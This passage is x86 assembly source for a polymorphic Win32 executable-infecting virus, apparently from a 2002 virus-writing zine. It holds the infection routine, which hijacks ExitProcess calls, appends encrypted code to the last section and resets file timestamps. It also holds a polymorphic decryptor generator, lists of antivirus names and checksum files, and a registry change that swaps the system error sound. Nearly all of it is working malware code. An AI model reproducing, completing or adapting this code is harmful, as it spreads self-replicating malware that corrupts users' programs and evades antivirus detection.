        mov     eax, [edx].sec_PointerToRawData
        mov     ebx, edx
NotLastSection:
        add     edx, size SECTION
        loop    LastSectionLoop
        mov     LastSectionEntryPtr+ebp, ebx
        pop     edx
        pop     ecx

; Get Biggest Writable Data Section
        push    ecx
        push    edx
        xor     eax, eax        ; Largest section found so far
DataSectionLoop:
        test    byte ptr [edx].sec_Characteristics+3, 80h ; Writable section?
        jz      short NextDataSec
        cmp     eax, [edx].sec_VirtualSize
        jae     short NextDataSec
        mov     eax, [edx].sec_VirtualSize
        mov     ebx, edx
NextDataSec:
        add     edx, size SECTION
        loop    DataSectionLoop
        pop     edx
        pop     ecx

        mov     DataSectionEntryPtr+ebp, ebx

        cmp     eax, VIRUSTOTALSIZE
        jnb     short DataSectionSizePass

; ***************
;  If Data Size is just a little too small, then bump it up
; ***************
        mov     ebx, [edi].SectionAlignment
        dec     ebx
        add     eax, ebx
        not     ebx
        and     eax, ebx
        cmp     eax, VIRUSTOTALSIZE
        jb      InfectableNo
DataSectionSizePass:
        mov     NewVirtualSizeOfData+ebp, eax

; Find Code Section
        xor     ebx, ebx
FindCodeSection:
        test    [edx].sec_Characteristics, SEC_CODE+SEC_EXECUTABLE
        jz      short NotACodeSection
        test    byte ptr [edx].sec_Characteristics+3, 80h ; Writable CS?
        jnz     InfectableNo
        or      ebx,ebx
        jnz     InfectableNo
        mov     ebx, edx
NotACodeSection:
        add     edx, size SECTION
        loop    FindCodeSection

;* Find amount of space at the end of the of the code section.
        mov     edx, [ebx].sec_PointerToRawData
        add     edx, esi
        cmp     [ebx].sec_SizeOfRawData, MINCODESIZE
        jb      InfectableNo


; Figure out the real code size
        xor     ecx,ecx
        mov     FoundExitCall+ebp, ecx
        mov     ecx, [edi].FileAlignment
        dec     ecx
        test    [ebx].sec_VirtualSize, ecx
        jz      short ProbablyTLINK
; Assuming LINK - i.e. Virtual Size gives exact size of CS (not aligned).
        mov     eax, [ebx].sec_VirtualSize
        add     edx, eax
        push    eax
        and     eax, ecx
        inc     ecx
        sub     ecx, eax
        pop     eax
        add     eax, [ebx].sec_PointerToRawData
        cmp     ecx, MINSLACKSPACE
        jb      InfectableNo
; Now:
;  - RVA         -done (eax)
;  - RawAddy     -done (edx)
;  - SizeOfSpace -done (ecx)
        mov     EmptyCodeSecRVA+ebp, eax
        mov     EmptyCodeSecAddr+ebp, edx
        mov     EmptyCodeSecSize+ebp, ecx

; Now we search .text for either:
;  - EE 15  (call [address])
;  - FF 25  (jmp  [address])

        mov     ecx, [ebx].sec_SizeOfRawData
        sub     ecx, 5                  ; (no need to check last 5 bytes)
        push    esi
        mov     eax, [ebx].sec_PointerToRawData
        add     eax, esi
        xchg    eax, esi
        xor     edx, edx                ; Loop counter
LinkFindJump:
        cmp     word ptr [esi+edx], 15FFh
        jne     short LinkJumpNotFound

        mov     eax, dword ptr [esi+edx+2]
        sub     eax, [edi].ImageBase
        cmp     eax, ExitProcessRVA+ebp
        jne     short LinkJumpNotFound

        mov     eax, EmptyCodeSecRVA+ebp
        sub     eax, edx
        sub     eax, [ebx].sec_VirtualAddress
        sub     eax, 5
        mov     byte ptr [esi+edx], 0E9h        ; Write in jump to our code ;-)
        mov     dword ptr [esi+edx+1], eax
        inc     FoundExitCall+ebp
LinkJumpNotFound:
        inc     edx
        cmp     edx, ecx
        jb      LinkFindJump
        pop     esi
        jmp     HaveCSInfo
ProbablyTLINK:
        add     edx, [ebx].sec_SizeOfRawData
        inc     ecx
ScanSpaceBackWard:
        dec     edx
        cmp     byte ptr [edx], 0
        jne     short FoundActualCode
        loop    ScanSpaceBackWard
        jmp     InfectableNo            ; Probably Some Packer
FoundActualCode:
        add     edx, 5                  ; edx= Raw Adrress of free space
        add     ecx, 4
        sub     ecx, [edi].FileAlignment
        neg     ecx                     ; ecx= size of free space
        mov     eax, [ebx].sec_VirtualAddress
        add     eax, [ebx].sec_SizeOfRawData
        sub     eax, ecx

        cmp     ecx, MINSLACKSPACE
        jb      InfectableNo
; Now:
;  - RVA         -done (eax)
;  - RawAddy     -done (edx)
;  - SizeOfSpace -done (ecx)
        mov     EmptyCodeSecRVA+ebp, eax
        mov     EmptyCodeSecAddr+ebp, edx
        mov     EmptyCodeSecSize+ebp, ecx

; Now we search .text for either:
;  - EE 15  (call [address])
;  - FF 25  (jmp  [address])

        mov     ecx, [ebx].sec_SizeOfRawData
        sub     ecx, 5                  ; (no need to check last 5 bytes)
        push    esi
        mov     eax, [ebx].sec_PointerToRawData
        add     eax, esi
        xchg    eax, esi
        xor     edx, edx                ; Loop counter
TLinkFindJump:
        cmp     word ptr [esi+edx], 25FFh
        jne     short TLinkJumpNotFound

        mov     eax, dword ptr [esi+edx+2]
        sub     eax, [edi].ImageBase
        cmp     eax, ExitProcessRVA+ebp
        jne     short TLinkJumpNotFound
        mov     eax, EmptyCodeSecRVA+ebp
        sub     eax, edx
        sub     eax, [ebx].sec_VirtualAddress
        sub     eax, 5
        mov     byte ptr [esi+edx], 0E9h        ; Write in jump to our code ;-)
        mov     dword ptr [esi+edx+1], eax
        inc     FoundExitCall+ebp
TLinkJumpNotFound:
        inc     edx
        cmp     edx, ecx
        jb      TLinkFindJump
        pop     esi

HaveCSInfo:
        cmp     FoundExitCall+ebp, 0
        je      InfectableNo

        mov     eax, GetModuleHandleRVA+ebp     ; Link to GetModuleHandle
        add     eax, [edi].ImageBase
        mov     GetModHandleAddy+ebp, eax
        mov     eax, ExitProcessRVA+ebp         ; Setup emergency escape for
        add     eax, [edi].ImageBase            ;  the next generation.
        mov     EmergencyExitAddy+ebp, eax      ;  (hopefully never needed)

        push    esi
        push    edi
        mov     esi, edi
        call    MakeDecryptor
        pop     edi
        pop     esi

        mov     edx, DataSectionEntryPtr+ebp    ; If link and ds too small,
        mov     eax, NewVirtualSizeOfData+ebp   ;  then make it bigger
        mov     [edx].sec_VirtualSize, eax      ;  else stay the same

        mov     edx, LastSectionEntryPtr+ebp    ; Fixup Last Section Sizes
        mov     ecx, [edi].FileAlignment
        mov     eax, [edx].sec_SizeOfRawData
        mov     esi, eax                        ; esi= size of last section
        add     eax, VIRUSCODESIZE
        push    eax
        dec     ecx
        add     eax, ecx
        not     ecx
        and     eax, ecx                        ; eax= Aligned raw size of last section
        mov     [edx].sec_SizeOfRawData, eax
        pop     eax                             ; not rounded raw size + vir size
        mov     ecx, [edi].SectionAlignment
        dec     ecx
        add     eax, ecx
        not     ecx
        push    ecx
        and     eax, ecx
        mov     ecx, [edx].sec_VirtualSize      ; Get old size for Image size adjust
        mov     [edx].sec_VirtualSize, eax      ; Save New Section VSize
        sub     eax, ecx                        ; Get Size increase
        pop     ecx                             ; get Section mask (FFFFF000 usually)
        and     eax, ecx                        ; Sec Align total size increase
        add     [edi].SizeOfImage, eax          ; add it to the size

; Fix:
;  - Fix Last Section Size (done above)
;  - Fix Code Section Size (probably not needed)
;  - Fix up GetModHandleAddy (done above)
;
        mov     ecx, LastSectionEntryPtr+ebp
        mov     ebx, [ecx].sec_PointerToRawData
        add     ebx, esi
;int 3
        mov     eax, VIRUSCODESIZE-1
        mov     edi, [edi].FileAlignment
        add     eax, edi
        neg     edi
        and     edi, eax

        call    _UnmapViewOfFile+ebp            ; Handle Already on stack
        call    _CloseHandle+ebp                ; Handle Already on stack

        pop     esi                             ; Get File Handle
        push    esi                             ; File Handle back for later
        xor     eax, eax
        call    _SetFilePointer+ebp, esi, ebx, eax, FILE_BEGIN
        lea     eax, PolyedVirus+ebp
        lea     ecx, BytesWritten+ebp
;int 3
;       call    _WriteFile+ebp, esi, eax, VIRUSCODESIZE, ecx, 0
        call    _WriteFile+ebp, esi, eax, edi, ecx, 0

        inc     NumInfected+ebp
        lea     eax, FindFile.fd_ftCreationTime+ebp
        lea     ecx, FindFile.fd_ftLastAccessTime+ebp
        lea     edx, FindFile.fd_ftLastWriteTime+ebp
        call    _SetFileTime+ebp, esi, eax, ecx, edx
        jmp     short CloseAndExitInfector

UnmapAndClose:
        call    _UnmapViewOfFile+ebp            ; Handle Already on stack
        call    _CloseHandle+ebp                ; Handle Already on stack
CloseAndExitInfector:
        call    _CloseHandle+ebp                ; Again on Stack
ExitInfector:
        ret



;**********************



; Enter
;  eax = RVA
;  esi = Start Of Memory mapped PE file.
; Leave:
;  eax = Mem map Address
RVA2Addr:
        push    ebx
        push    edx
        push    ecx
        push    esi
        push    edi
        movzx   edi, word ptr [esi+3Ch]
        add     edi, esi
        movzx   edx, [edi].SizeOfOptionalHeader
        movzx   ecx, [edi].NumberOfSections
        lea     edx, [edi+edx+18h]              ; Start of Section table
        mov     ebx, [edx].sec_VirtualAddress
        mov     esi, [edx].sec_PointerToRawData
SectionLoop1:
        cmp     ebx, [edx].sec_VirtualAddress
        jae     short SkipSecLoop1
        cmp     eax, [edx].sec_VirtualAddress
        jb      short SkipSecLoop1
        mov     ebx, [edx].sec_VirtualAddress
        mov     esi, [edx].sec_PointerToRawData
SkipSecLoop1:
        add     edx, size SECTION
        loop    SectionLoop1
        sub     eax, ebx
        add     eax, esi
        pop     edi
        pop     esi
        add     eax, esi
        pop     ecx
        pop     edx
        pop     ebx
        ret


MakeDecryptor:
        lea     edi, PolyedVirus+ebp
        mov     PolySizeCount+ebp, edi  ; Counter for number of bytes used.
        mov     StackRestore+ebp, esp
if DEBUGENTRY
        mov     al, 0CCh
        stosb
endif

        call    SelectRegs2
        call    CreateInitCode
        call    MarkLoop
        call    CreateLoad
        call    CreateEncryption
        call    CreateAddInECX
        call    CreateStore
        call    CreateLoop
        call    CreateGotoVirus
FinishedAlgorithm:

        mov     esi, PolySizeCount+ebp
        sub     edi, esi
        cmp     edi, EmptyCodeSecSize+ebp
        ja      short MakeDecryptor
        mov     ecx, edi
        mov     edi, EmptyCodeSecAddr+ebp
        push    esi
        rep     movsb
        pop     edi

        lea     esi, VirusStart+ebp
        mov     ecx, VIRUSCODESIZE
EncryptVirus2:
        lodsb
        call    PolyEncryptPtr+ebp
        stosb
        loop    EncryptVirus2
        ret



MakePolyError:
        mov     esp, StackRestore+ebp
        jmp     MakeDecryptor




; *-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*
;   Atom Functions
; *-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*

CreateZero:
        call    randomslow
        test    al, 11
        je      short CreateZeroMov

        or      al, al
        js      short CreateZeroSub
CreateZeroXor:
        mov     eax, edx
        shl     eax, 11
        or      ax, 0C031h
        jmp     short CreateZeroCommon
CreateZeroSub:
        mov     eax, edx
        shl     eax, 11
        or      ax, 0C029h
CreateZeroCommon:
        or      ah, dl
        stosw
        ret
CreateZeroMov:
        push    ecx
        xor     ecx, ecx
        call    CreateMov
        pop     ecx
        ret

; --------

CreateAdd:
        mov     al, 5
        cmp     dl, 0   ; eax
        je      short EntryFromCreateSub2
        cmp     ecx, 7Fh
        jbe     short CreateAddSX
        cmp     ecx, -80h
        jb      short CreateAddNoSX
CreateAddSX:
        mov     al, 83h
        stosb
        mov     al, 0C0h
EntryFromCreateSub3:
        or      al, dl
        stosb
        mov     al, cl
        stosb
        ret
CreateAddNoSX:
        mov     al, 81h
        stosb
        mov     al, 0C0h
EntryFromCreateSub1:
        or      al, dl
EntryFromCreateSub2:
        stosb
        mov     eax, ecx
        stosd
        ret

; --------

CreateSub:
        mov     al, 2Dh
        cmp     dl, 0   ; eax
        je      short EntryFromCreateSub2
        cmp     ecx, 7Fh
        jbe     short CreateSubSX
        cmp     ecx, -80h
        jb      short CreateSubNoSX
CreateSubSX:
        mov     al, 83h
        stosb
        mov     al, 0E8h
        jmp     short EntryFromCreateSub3
CreateSubNoSX:
        mov     al, 81h
        stosb
        mov     al, 0E8h
        jmp     short EntryFromCreateSub1

; --------

CreateMov:
        mov     al, 0B8h
        jmp     short EntryFromCreateSub1

; --------

CreateInc:
        mov     al, 40h
EntryFromDec:
        or      al, dl
        stosb
        ret

; --------

CreateDec:
        mov     al, 48h
        jmp     short EntryFromDec

; --------

CreatePush:
        mov     al, 50h
        jmp     short EntryFromDec

; --------

CreateXor8:
        or      dl, dl
        je      short CreateXorAL
        mov     ax, 0F080h
        or      ah, dl
        stosw
        jmp     short CreateXor8Common
CreateXorAL:
        mov     al, 34h
        stosb
CreateXor8Common:
        dec     ebx
        dec     ebx
        mov     byte ptr [ebx], 34h
EntryFromCreateAdd8:
        call    randomfast
        stosb
        mov     byte ptr [ebx+1], al
        ret


CreateAdd8:
        or      dl, dl
        je      short CreateAdd8AL
        mov     ax, 0C080h
        or      ah, dl
        stosw
        jmp     short CreateAdd8Common
CreateAdd8AL:
        mov     al, 04h
        stosb
CreateAdd8Common:
        dec     ebx
        dec     ebx
        mov     byte ptr [ebx], 2Ch
        jmp     short EntryFromCreateAdd8


CreateRol8:
        sub     ebx, 3
        mov     ax, 0C8C0h
        mov     word ptr [ebx], ax
        and     ah, 0F7h
        or      ah, dl
        stosw
RolNoGood:
        call    randomfast
        and     al, 7
        jz      RolNoGood
        stosb
        mov     byte ptr [ebx+2], al
        ret


CreateSub8:
        or      dl, dl
        je      short CreateSub8AL
        mov     ax, 0E880h
        or      ah, dl
        stosw
        jmp     short CreateSub8Common
CreateSub8AL:
        mov     al, 2Ch
        stosb
CreateSub8Common:
        dec     ebx
        dec     ebx
        mov     byte ptr [ebx], 04h
        jmp     short EntryFromCreateAdd8


; *-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*
;   Mid-Level Functions
; *-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*

CreateMidInit:
        call    randomslow
        or      al,al
        js      short CreateInitZAdd
        call    CreateMov
        ret
CreateInitZAdd:
        test    al, 1
        je      short CreateInitSub
        call    CreateZero
        call    CreateAdd
        ret
CreateInitSub:
        call    CreateZero
        neg     ecx
        call    CreateSub
        ret

;----------

CreateMidInc:
        call    randomslow
        or      al,al
        js      short CreateMidIncAdd
        call    CreateInc                       ; Inc
        ret
CreateMidIncAdd:
        push    ecx
        xor     ecx,ecx
        inc     ecx
        test    al, 1
        jz      short CreateMidIncSub
EntryFromMidDec_Add:
        call    CreateAdd                       ; Add 1
        jmp     short CreateMidIncDone
CreateMidIncSub:                                ; Sub -1
        neg     ecx
EntryFromMidDec_Sub:
        call    CreateSub
CreateMidIncDone:
        pop     ecx
        ret

;----------

CreateMidDec:
        call    randomslow
        or      al,al
        js      short CreateMidDecSub
        call    CreateDec
        ret
CreateMidDecSub:
        push    ecx
        xor     ecx,ecx
        inc     ecx
        test    al, 1
        jnz     short EntryFromMidDec_Sub
CreateMidDecAdd:
        neg     ecx
        jmp     short EntryFromMidDec_Add



; *-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*
;   Complex Functions
; *-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*

CreateLoadMem:
        mov     al, dl
        shl     eax, 11
        or      ax, 008Ah
        or      ah, cl
        stosw
        mov     dl, cl
        call    CreateMidInc
        ret

CreateStoreMem:
        mov     al, dl
        shl     eax, 11
        or      ax, 0088h
        or      ah, cl
        stosw
        mov     dl, cl
        call    CreateMidInc
        ret


CreateSourceInit:
        mov     dl, PolySourceReg+ebp
        mov     eax, LastSectionEntryPtr+ebp
        mov     ecx, [eax].sec_VirtualAddress
        add     ecx, [eax].sec_SizeOfRawData
        add     ecx, [esi].ImageBase
        call    CreateMidInit
        ret

CreateDestInit:
        mov     dl, PolyDestReg+ebp
        mov     eax, DataSectionEntryPtr+ebp
        mov     ecx, [eax].sec_VirtualAddress
        add     ecx, [esi].ImageBase
        call    CreateMidInit
        test    byte ptr PolyFlag+ebp, 1
        jnz     short CreateDestInitDone
        call    CreatePush
CreateDestInitDone:
        ret

CreateCntrInit:
        mov     dl, PolyCntrReg+ebp
        mov     ecx, VIRUSCODESIZE
        call    CreateMidInit
        ret

MarkLoop:
        mov     LoopLocation+ebp, edi
        ret

CreateLoad:
        mov     dl, PolyWorkReg+ebp
        mov     cl, PolySourceReg+ebp
        or      dl, dl
        jne     short CreateLoadMemCall
        cmp     cl, 6
        jne     short CreateLoadMemCall
        mov     al, 0ACh
        stosb
        ret
CreateLoadMemCall:
        call    CreateLoadMem
        ret

CreateStore:
        mov     dl, PolyWorkReg+ebp
        mov     cl, PolyDestReg+ebp
        or      dl, dl
        jne     short CreateStoreMemCall
        cmp     cl, 7
        jne     short CreateStoreMemCall
        mov     al, 0AAh
        stosb
        ret
CreateStoreMemCall:
        call    CreateStoreMem
        ret

CreateLoop:
        mov     dl, PolyCntrReg+ebp
        mov     al, 0E2h
        cmp     dl, 1
        je      short MakeLoopCommon
LoopNotECX:
        call    CreateMidDec
        mov     al, 75h
MakeLoopCommon:
        stosb
        mov     eax, LoopLocation+ebp
        sub     eax, edi
        dec     eax
        stosb
        cmp     eax, -80h
        jb      MakePolyError
        ret

CreateGotoVirus:
        test    byte ptr PolyFlag+ebp, 1
        jz      short CreateGotoVirusRet
        mov     al, 0E9h
        stosb
        mov     eax, DataSectionEntryPtr+ebp
        mov     eax, [eax].sec_VirtualAddress
        mov     ecx, EmptyCodeSecRVA+ebp
        sub     eax, ecx
        mov     ecx, edi
        sub     ecx, PolySizeCount+ebp
        add     ecx, 4
        sub     eax, ecx
        stosd
        ret
CreateGotoVirusRet:
        mov     al, 0C3h
        stosb
        ret

InstructInitTable:
        dd      offset CreateSourceInit
        dd      offset CreateDestInit
        dd      offset CreateCntrInit
CreateInitCode:
        xor     ecx, ecx
CreateInitLoop:
        call    randomslow
        and     eax, 3
        jz      short CreateInitLoop
        dec     eax
        bts     ecx, eax
        jc      short CreateInitLoop
        mov     eax, [ebp+4*eax+offset InstructInitTable]
        add     eax, ebp
        push    ecx
        call    eax
        pop     ecx
        cmp     cl, 7
        jne     short CreateInitLoop
        ret

SelectRegs2:
        call    randomslow
        mov     PolyFlag+ebp, al
        mov     dl, 00110000b
GetWork2:
        call    randomfast
        or      al, al
        js      short PickRandWork2
        test    dl, 1
        jnz     short PickRandWork2
        mov     byte ptr PolyWorkReg+ebp, 0
        or      dl, 1
        jmp     short GetSource2
PickRandWork2:
        call    GetFreeRegister8
        mov     PolyWorkReg+ebp, al
GetSource2:
        call    randomfast
        or      al, al
        js      short PickRandSource2
        test    dl, 40h
        jnz     short PickRandSource2
        mov     byte ptr PolySourceReg+ebp, 6
        or      dl, 40h
        jmp     short GetCntr2
PickRandSource2:
        call    GetFreeRegister
        mov     PolySourceReg+ebp, al
GetCntr2:
        call    randomfast
        or      al, al
        js      short PickRandCntr2
        test    dl, 2
        jnz     short PickRandCntr2
        mov     byte ptr PolyCntrReg+ebp, 1
        or      dl, 2
        jmp     short GetDest2
PickRandCntr2:
        call    GetFreeRegister
        mov     PolyCntrReg+ebp, al
GetDest2:
        call    randomfast
        or      al, al
        js      short PickRandDest2
        test    dl, 80h
        jnz     short PickRandDest2
        mov     byte ptr PolyDestReg+ebp, 7
        or      dl, 80h
        jmp     short SelectRegsDone2
PickRandDest2:
        call    GetFreeRegister
        mov     PolyDestReg+ebp, al
SelectRegsDone2:
        ret

CreateAddInECX:
        test    byte ptr PolyFlag+ebp, 2
        jnz     short SelectRegsDone2
        mov     al, PolyCntrReg+ebp
        cmp     al, 4
        jae     short SelectRegsDone2
        shl     eax, 11
        or      ax, 0C000h
        or      ah, PolyWorkReg+ebp
        stosw
        mov     ecx, PolyEncryptPtr+ebp
        dec     ecx
        dec     ecx
        mov     ax, 0C828h
        mov     word ptr [ecx], ax
        mov     PolyEncryptPtr+ebp, ecx
        ret


GetFreeRegister8:
        call    randomfast
        and     al, 7
        mov     ah, 1
        xchg    ecx, eax
        test    cl, 4
        jnz     short UpperRegister8
        rol     ch, cl
GetReg8Common:
        xchg    ecx, eax
        test    dl, ah
        jnz     GetFreeRegister8
        or      dl, ah
        ret
UpperRegister8:
        and     cl, 3
        rol     ch, cl
        or      cl, 4
        jmp     GetReg8Common

GetFreeRegister:
        call    randomfast
        and     eax, 7
        bts     edx, eax
        jc      GetFreeRegister
        ret


EncryptOpTable:
        dd      offset  CreateXor8
        dd      offset  CreateAdd8
        dd      offset  CreateRol8
        dd      offset  CreateSub8

        db      45 dup (?)                      ; Hold encryption code.
OpcodeStack:
        ret

CreateEncryption:
        mov     byte ptr OpcodeFlag+ebp, 0
        lea     ebx, OpcodeStack+ebp
        call    randomslow
        xchg    eax, ecx
        and     ecx, 7
        inc     ecx
MakeEncryptOps:
        call    randomslow
        and     eax, 03h
        cmp     OpcodeFlag+ebp, al
        je      short MakeEncryptOps
        mov     OpcodeFlag+ebp, al
        mov     eax, [ebp+4*eax+offset EncryptOpTable]
        add     eax, ebp
        mov     dl, PolyWorkReg+ebp
        call    eax
        loop    MakeEncryptOps
        mov     PolyEncryptPtr+ebp, ebx
        ret


; -***********************************-
;  Psuedo Random Number Generator
; -***********************************-
randomslow:
if DEBUG
        jmp     short randomfast
endif
        push    edi
        lea     edi, CurrentTime.ft_dwHighDateTime+ebp
        call    RandomCommon
        pop     edi
        ret

randomfast:
        push    edi
        lea     edi, CurrentTime.ft_dwLowDateTime+ebp
        call    RandomCommon
        pop     edi
        push    ecx
        push    edx
        mov     ecx, eax
        jmp     short RandPentiumExt
RandReturn:
        pop     edx
        pop     ecx
        ret
RandPentiumExt:
        db      0Fh, 31h                ; rdtsc instruction (possible exceptn)
        jmp     $+2                     ;  should add SEH handler,
        xor     eax, ecx                ;  but I just don't care anymore
        jmp     short RandReturn

RandomCommon:
        push    ecx
        push    edx
        push    ebx
        mov     eax, dword ptr [edi]
        cdq
        mov     ecx, 44488
        idiv    ecx
        push    edx
        mov     ecx, 3399
        mul     ecx
        xchg    eax, ebx
        pop     eax
        mov     ecx, 48271
        mul     ecx
        sub     eax, ebx
        stosd
        jnl     short RandTooLow
        add     eax, 7FFFFFFFh
RandTooLow:
        dec     eax
        pop     ebx
        pop     edx
        pop     ecx
        ret

;
; esi = Function names
; edi = address destination
; ebx = handle of Lib
;
; returns:
;       carry flag clear if ok, set if error
FillImports:
        lodsb
        movzx   ecx, al
        jecxz   FillImpDone
        push    esi
        add     esi, ecx
        call    _GetProcAddress+ebp, ebx
        or      eax,eax
        jz      short FillImpFail
        stosd
        jmp     short FillImports
FillImpDone:
        clc
        ret
FillImpFail:
        stc
        ret
include adecode.asi

; -==============================-
;   Initialized Data
; -==============================-

if DEBUGROOTDIR
  RootDir       db      'GOATS',0
 else
  RootDir       dd      '\',0
 endif
FileMaskAny             db      '*.*',0
FileMaskExe             db      '*.EXE',0
nKernel32               db      'KERNEL32',0
nExitProcess            db      'ExitProcess',0
nGetModuleHandle        db      'GetModuleHandleA',0
AVNames                 db      3,'AVP'
                        db      4,'SCAN'
                        db      6,'FINDVI'
                        db      2,'F-',0
CRCNames                db      13,'ANTI-VIR.DAT',0
                        db      11,'CHKLIST.MS',0
                        db      8,'AVP.CRC',0
                        db      8,'IVB.NTZ',0
                        db      0

nGetProcAddr            db      'GetProcAddress',0
InfFunctions:
        db      12,'CreateFileA',0
        db      19,'CreateFileMappingA',0
        db      14,'MapViewOfFile',0
        db      16,'UnmapViewOfFile',0
        db      12,'CloseHandle',0
        db      15,'SetFilePointer',0
        db      10,'WriteFile',0
        db      24,'GetSystemTimeAsFileTime',0
        db      21,'GetCurrentDirectoryA',0
        db      21,'SetCurrentDirectoryA',0
        db      15,'FindFirstFileA',0
        db      14,'FindNextFileA',0
        db      10,'FindClose',0
        db      19,'SetFileAttributesA',0
        db      12,'SetFileTime',0
        db      12,'ExitProcess',0
        db      12,'DeleteFileA',0
        db      21,'GetWindowsDirectoryA',0
        db      13,'LoadLibraryA',0
        db      12,'FreeLibrary',0
        db      0

BakaWav:
include baka.bin

bakafile db     '\baka.wav',0
RegKey   db     '.DEFAULT\AppEvents\Schemes\Apps\.Default\AppGPFault\.Current',0

RegFunctions:
        db      12,'RegOpenKeyA',0
        db      12,'RegCloseKey',0
        db      13,'RegSetValueA',0
        db      0


VirusInitEnd:

_GetProcAddress         dd      ?
InfDest:                                ; Have to be in Same order as above
_CreateFileA            dd      ?
_CreateFileMappingA     dd      ?
_MapViewOfFile          dd      ?
_UnmapViewOfFile        dd      ?
_CloseHandle            dd      ?
_SetFilePointer         dd      ?
_WriteFile              dd      ?
_GetSystemTimeAsFileTime dd     ?
_GetCurrentDirectoryA   dd      ?
_SetCurrentDirectoryA   dd      ?
_FindFirstFileA         dd      ?
_FindNextFileA          dd      ?
_FindClose              dd      ?
_SetFileAttributesA     dd      ?
_SetFileTime            dd      ?
_ExitProcess            dd      ?
_DeleteFileA            dd      ?
_GetWindowsDirectoryA   dd      ?
_LoadLibraryA           dd      ?
_FreeLibrary            dd      ?
RegFuncDest:
_RegOpenKeyA            dd      ?
_RegCloseKey            dd      ?
_RegSetValueA           dd      ?

SFCLib                  dd      ?
_SfcIsFileProtected     dd      ?

SearchHnd               dd      ?
RegHnd                  dd      ?

NumOfNames              dd      ?
ExitProcessRVA          dd      ?
GetModuleHandleRVA      dd      ?
NewVirtualSizeOfData    dd      ?
EmptyCodeSecRVA         dd      ?
EmptyCodeSecAddr        dd      ?
EmptyCodeSecSize        dd      ?
LastSectionEntryPtr     dd      ?
DataSectionEntryPtr     dd      ?
BytesWritten            dd      ?
FoundExitCall           dd      ?

ExeGoodCount            dd      ?
ExeBadCount             dd      ?
NonExeCount             dd      ?
ExeSizesPtr             dd      ?
DirCount                dd      ?

LetterCount             db      ?
LastLetter              db      ?
NumInfected             db      ?
AVCRCFlag               db      ?

; Regs ok are: 0-3,6,7 (eax, ecx, edx, ebx, esi, edi)
PolyFlag        db      ?
PolySizeCount   dd      ?
LoopLocation    dd      ?
PolyEncryptPtr  dd      ?
StackRestore    dd      ?
PolySourceReg   db      ?
PolyDestReg     db      ?
PolyCntrReg     db      ?
PolyWorkReg     db      ?
OpcodeFlag      db      ?




DirBuf                  db              256 dup (?)
CurrentTime             FILETIME        ?
FindFile                WIN32_FIND_DATA <?>
ExeSizes                dd              MAXEXEPERDIR dup (?)
buffer                  db      (MAX_PATH+10) dup (?)
PolyedVirus             db      VIRUSCODESIZE dup (?)

VirusEnd:



        end     HOST

 COMMENT ` ---------------------------------------------------------------- )=-
 -=( Natural Selection Issue #1 --------------- (c) 2002 Feathered Serpents )=-
 -=( ---------------------------------------------------------------------- ) `
